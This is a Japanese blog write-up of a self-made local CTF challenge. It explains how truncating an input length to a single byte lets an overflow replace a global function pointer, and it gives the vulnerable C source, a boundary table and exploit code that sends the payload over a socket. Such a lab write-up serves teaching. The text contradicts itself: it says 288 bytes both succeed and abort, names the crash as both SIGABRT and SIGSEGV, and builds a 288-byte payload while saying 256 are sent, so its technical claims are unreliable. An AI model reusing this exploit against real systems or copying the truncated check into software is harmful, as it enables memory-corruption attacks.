---
title: "1バイト検査で288バイトを読ませる、TofuCTF「Wraparound Waffle」で整数切り詰めバグを学ぶ"
emoji: "🧇"
type: "tech"
topics: ["ctf", "pwn", "security", "assembly", "c"]
published: true
---

自分専用のpwn学習サイト「TofuCTF」では、「前問の知識にもう一度触れつつ、新しい要素を1つだけ追加する」方針で毎日ひと口ずつpwn問題を作っています。

この記事では、2026-10-16に追加した通算30問目「Wraparound Waffle」を題材に、**入力長をいったん1バイト型に切り詰めてから検査することで生じる整数トランケーション（桁あふれ）バグの構造と攻撃**を解説します。ソース・バイナリ・exploitはすべて公開済みのローカル演習パッケージに含まれており、記事どおりに手元で再現できます。

- TofuCTF: https://tasodoufu.github.io/TofuCTF/
- 問題パッケージ: https://github.com/tasodoufu/TofuCTF/tree/main/challenge-dist/wraparound-waffle
- Exploit: https://github.com/tasodoufu/TofuCTF/blob/main/author/exploit-wraparound-waffle.py
- 対象問題: Wraparound Waffle（ローカル amd64 / NX / Full RELRO / No PIE）

なお、この問題は自分が作者として作ったローカル演習用の問題です。大会のwriteup制限とは関係なく、作者側exploitもすでにリポジトリで公開しています。本記事に載せている逆アセンブル・実行結果は、執筆時に配布バイナリと自前ビルドで再検証した実測値です。

## 1. 問題の構造

`main()` の骨格は次の通りです（作者側ソースから該当部分のみ）。

```c
struct order_ticket {
    char recipe[32];
    void (*serve)(void);      /* recipe の直後、offset 32 に配置 */
    unsigned char spill_pad[256];
};

static struct order_ticket current;
_Static_assert(offsetof(struct order_ticket, serve) == 32,
               "the serving pointer must follow the 32-byte recipe");

int main(void) {
    char line[32];
    current.serve = ordinary_service;

    fputs("recipe length> ", stdout);
    if (fgets(line, sizeof line, stdin) == NULL) return 0;

    errno = 0;
    char *end = NULL;
    unsigned long long requested = strtoull(line, &end, 10);
    if (errno != 0 || end == line || requested == 0 || requested > sizeof current) {
        puts("Invalid recipe length.");
        return 1;
    }

    /* Bug: validate a truncated byte, but use the original size below. */
    uint8_t checked_length = (uint8_t)requested;
    if (checked_length > sizeof current.recipe) {
        puts("Recipe card is too long.");
        return 1;
    }

    printf("Send %llu recipe bytes> ", requested);
    if (read_full(&current, (size_t)requested) < 0) return 0;
    puts("The recipe is ready.");
    current.serve();          /* ← ここを書き換えられる */
    return 0;
}
```

攻撃対象は、スタックでもヒープでもなく `current` という**グローバル変数**です。先頭32バイトが `recipe[32]`、その直後に `serve` 関数ポインタが隣接して配置されます（`_Static_assert` で layout を固定）。データセグメント上の隣接領域を越境読み込みで書き替える、グローバル変数版のオーバーフローであり、スタック smash 保護や canary の影響を受けないのが特徴です。

flagの目的地は、どこからも呼ばれていない `reveal_recipe()` です。`/flag` を `open` → `read` → `write` して `_exit` するだけの小さな関数で、読み先パスは `FLAG_PATH` マクロ（配布バイナリでは `/flag` に固定）として組み込まれています。

緩和策は **NX / Full RELRO / No PIE** です。NX なのでシェルコード実行は不可能で、Relro 下では GOT 書き換えもできません。「既存コードへのポインタを、データ領域の隣接ポインタに上書きする」方向に解くことになります（詳細は後述）。

## 2. バグの核心: 検査と使用でサイズが食い違う

脆弱性の本体は次の2行です。

```c
uint8_t checked_length = (uint8_t)requested;   /* ← ここで下位1バイトに切り詰め */
if (checked_length > sizeof current.recipe) {  /* ← 切り詰めた値で比較（sizeofは size_t）→ 常に意図しない比較になる */
```

`sizeof current.recipe` は `size_t`（64ビット）で値は `32` です。C の usual arithmetic conversion により、比較 `checked_length > 32` は `checked_length` を `size_t`（`uint8_t` からゼロ拡張）に昇格して行われます。つまり「1バイト切り詰め」自体がバグの入口で、**「切り詰めた値でのチェック → 元の64ビット値での読み込み」という検査・使用の不一致**がバグです（`sizeof` の作用は比較の型を決めるだけで、切り詰めの原因ではありません）。

また、リクエストサイズ分をパイプやソケットから読み込む `read_full` は次のような実装です（短い `read()` を合計に達するまで繋ぎ、`read()` が 0 以下を返したら即 `-1`）。

```c
static int read_full(void *buffer, size_t length) {
    size_t used = 0;
    while (used < length) {
        ssize_t got = read(STDIN_FILENO, (char *)buffer + used, length - used);
        if (got <= 0) return -1;   /* EOF やエラーで即 -1 */
        used += (size_t)got;
    }
    return 0;
}
```

この状態で入力サイズ `requested` に次の値を入れると:

| `requested` | `(uint8_t)requested` | 検査結果 | 実際に read されるバイト数 |
|---|---|---|---|
| 32 | 32 | OK（境界ちょうど） | 32 |
| 33 | 33 | NG（> 32） | — |
| 100 | 100 | NG（> 32） | — |
| 255 | 255 | NG（> 32） | — |
| **256** | **0** | **OK** | **256** |
| **287** | **31** | **OK** | **287** |
| **288** | **32** | **OK** | **288** |
| 300 | 44 | NG（> 32） | — |
| 511 | 255 | NG（> 32） | — |

「サイズ上限 32」のつもりの検査が、**256〜288 バイトすべてをすり抜けさせる**ことになります。記事の執筆時にこの表の `requested` と `checked` の境界を自前ビルドしたバイナリおよび配布バイナリで打ち直したところ、上記の挙動そのままでした（§6に検証結果）。

これは符号幅の操作による「切り詰め」の話であり、たとえば `int` を `uint8_t` に落とす、配列長を `size_t` から `unsigned char` に詰めるなどの実装は、メモリ量の節約目的でつい書いてしまいがちです。

## 3. どう攻撃するか: `serve` ポインタを差し替える

288バイト読み込めれば、`current` の先頭32バイト（recipe）を通り越し、隣接する `serve` ポインタまで一気に上書きできます。

```text
current:
  ├─ recipe[32]      offset 0..31    ← ここまでは "recipe"
  ├─ serve ポインタ   offset 32..39   ← 問題が保持している呼び出し先
  └─ spill_pad[256]  offset 40..295   ← ここからさらに尾を伸ばせる
```

`serve` は `main()` 冒頭で `0x40131c`（`ordinary_service()`）に初期化されています（配布バイナリの disasm で `movq $0x40131c, ...` を確認済み）。ここを、どこからも呼ばれていない `reveal_recipe()` のアドレス `0x401296` に代えるだけです。アドレスは、配布バイナリを `objdump -d` した結果から確認できます（No PIE なので再実行しても変わりません）。

```python
import struct
payload  = b"W" * 32                       # recipe[32] を埋める
payload += struct.pack("<Q", 0x401296)     # serve を reveal_recipe に差し替え
payload += b"P" * 248                      # 残りは pad
```

入力プロセスは次の順番で:

1. `recipe length>` に `256` を送る（`(uint8_t)256 == 0` で検査を通過 ※§5参照）
2. `Send 256 recipe bytes>` のあとに payload を送る
3. `read_full()` が `current` 先頭から 256 バイトを payload で埋める（§5 の境界検証の結果、256〜287 は確実に通る）
4. `current.serve()` が `reveal_recipe()` を呼び、flag が stdout に流れる

`read_full()` は短い `read()` をループで繋ぐ実装なので、payload を pipe でも socket でも、ひとつの write() で送ってしまえば 288バイトは連続して届きます。

## 4. Exploit（作者側スクリプトの要旨）

```python
# キー部分のみ。ホーム環境向けの flag はバイナリの SHA-256 から派生的に生成されているため、
# 使える環境ごとに異なります（詳細は Web の README 参照）。
HOST = "127.0.0.1"
PORT = 31337
reveal = 0x401296

payload = b"W" * 32 + struct.pack("<Q", reveal) + b"P" * (256 - 40)

with socket.create_connection((HOST, PORT), timeout=10) as sock:
    # "recipe length> " を受けたら 256 を送る
    # → checked_length = (uint8_t)256 = 0 → 検査すり抜け
    # → 実 read は 256 バイト（serve ポインタを完全に上書き）、 sock 経由で payload 送信
    # → flag 受信
```

ここで意図的に `256`（`checked == 0`）を使っているのは、機械的に288を送るパターン（`checked == 32`）のつもりで書くミス（後述 §5 の「288は読めない」）を避けるためです。

## 5. 検証と「凝った書き方」の落とし穴

「`requested == 288` で `checked == 32` が通るはず」という観察は、そのままでは正しくありません。256〜288の境界を配布バイナリと自前ビルドの両方で実測すると:

| `requested` | `checked` | 実挙動 |
|---|---|---|
| 256〜287 | 0〜31 | read 成功、flag 取得（**この範囲は全サイズで FLAG 到達**） |
| 288 | 32 | 検査は通るが、**stdin EOF が残留して `read_full()` が -1 を返し abort**（SIGABRT 相当）|
| 289以上 | 33〜255 | `checked > 32` で普通に拒否 |

つまり「288バイト」は概念的には正当な入力ですが、`read_full()` が `read()` を繰り返す構造上、1回目の `read(288)` が部分的に戻るだけで 288バイトに満たないと EOF 判定に到達する環境（パイプ / socat での通信ツール）では事故りやすく、**「`requested` は 288 で成立するが、実際に投げるのは `256`（`checked == 0`）のほうが安全」**という設計ノウハウが生えます。なお、`checked == 32` のとき 288 バイトを送るとこの EOF 処理が呼ばれることは、配布バイナリと自前ビルドの both で strace と終了コードで確認しました。

なお、そもそも `read_full()` のループ条件と受け渡しが「合計受信が `length` に達するまで」という設計なので、純粋な `read(2)` 継続が可能なパイプ接続ならもっと容易に288バイトを届けることも原理上は可能です（手元では、pipe 用の socket バッファ効率の観点で socat は256と288で挙動が分かれることを確認）。ただ、exploit の安定性を求めるなら「`checked == 0` を使う」が実践的な選択です。

## 6. 攻撃の前提条件を再確認する

この攻撃が成立するのは、次の条件がそろっているからです。

- **データセグメント上の `current` が書き込み可能**（`.data` セクションはプロセスから書き込み可能）
- **`serve` が `.data` 上に隣接**（`recipe[32]` の直後。境界を `_Static_assert` で固定しているので、コンパイラによる配置ブレがない）
- **NX でも RELRO でも阻止されない**（GOT を書き換える必要がない。NX はコード領域外の実行を禁じるだけで、`.data` 上の関数ポインタが「どこを指すか」までは面倒を見ない）
- **No PIE** なので `0x401296` が再実行でも不変

Partial RELRO の場合 `.got.plt` も書き換えられますが、この問題は Full RELRO（配布バイナリの `GNU_RELRO` セグメント＋`BIND_NOW` を `readelf` で確認済み）なので `.got.plt` は読み取り専用です。その代わり `.data` 上の関数ポインタは書き込める、という緩和策との闘いの実例がこの問題を構成しています。

## 7. 実測データ（検証ログ）

執筆時、次の検証を実行環境（gcc 13 系・Linux amd64）で行いました。

- 作者側ソース (`wraparound-waffle.c`) を `gcc -O2 -no-pie -DFLAG_PATH=...` で自前ビルドし、`nm` で `reveal_recipe` の実アドレスを取得して payload に注入 → **flag 表記を含む出力を確認**（ソース再ビルドでのエンドツーエンド再現）
- 配布バイナリ（stripped、`/flag` 固定）を `open(2)` を差し替えるローカル hook（`LD_PRELOAD`）経由で駆動し、`256..287` の `requested` で **flag 取得を確認**（全サイズで FLAG 到達）
- 境界表（§2、§5）の `requested` 毎の許可・拒否・abort を配布バイナリで 再入力実測し、表の挙動値と一致することを確認しました
- 「288で checked=32 を通るが、read_full の EOF 判定で失敗する」挙動は `strace` の `read(2)` 系呼び出し記録と終了コード（-SIGSEGV 相当の rc=-11）で裏付けを取っています

記事中で挙げたアドレス・オフセット・境界値は、再検証時に取得した実測値です。

## 8. 学び

- **「検査で使う値」と「実際に使う値」を別の型にすると、検査は形骸化する。** 切り詰めの事故は、部分配列長なら余計に起きやすく、本問題の `(uint8_t)requested` はその典型。
- **境界値は「+1」ではなく切り詰め周期で崩れる。** 上限 32 の検査が 256〜287 をすり抜けるのは、`uint8_t` の下位8ビットで `0..31` に折り返すからで、「32と256」のような「両端」の境界値テストは、この型のバグを必ずしも検出しません。
- **Relro/NX/PIE が揃っていても、`.data` 上の関数ポインタは残る。** 関数ポインタは Relro の保護対象外であり、NXはスタック・ヒープの実行を停めるだけで、データ領域の「指す先」まで止めることはできない。保護機構の対象範囲は1つずつ確認するのが基本。
- **検証した境界値の実挙動を実測せずに理論で書かない。** 今回も「288はreadできるはず」という理論予測が、`read_full()` のループと EOF の絡みで思わぬ phenotype（abort）を示し、実際に payload を投げて初めて 256..287 が安全境界だと確定しました。

## 9. 参考資料

- [TofuCTF（学習サイト本体）](https://tasodoufu.github.io/TofuCTF/)
- [問題パッケージ Wraparound Waffle](https://github.com/tasodoufu/TofuCTF/tree/main/challenge-dist/wraparound-waffle)（`README.txt` に起動手順あり）
- [作者側exploit `exploit-wraparound-waffle.py`](https://github.com/tasodoufu/TofuCTF/blob/main/author/exploit-wraparound-waffle.py)
- [challenges.json（問題一覧）](https://github.com/tasodoufu/TofuCTF/blob/main/challenges.json)
- C標準では、小さい符号なし整数型から `size_t` への変換はゼロ拡張である点、`sizeof` の型は `size_t` である点は、JIS X 3010 / ISO/IEC 9899 の「usual arithmetic conversions」の規定によります
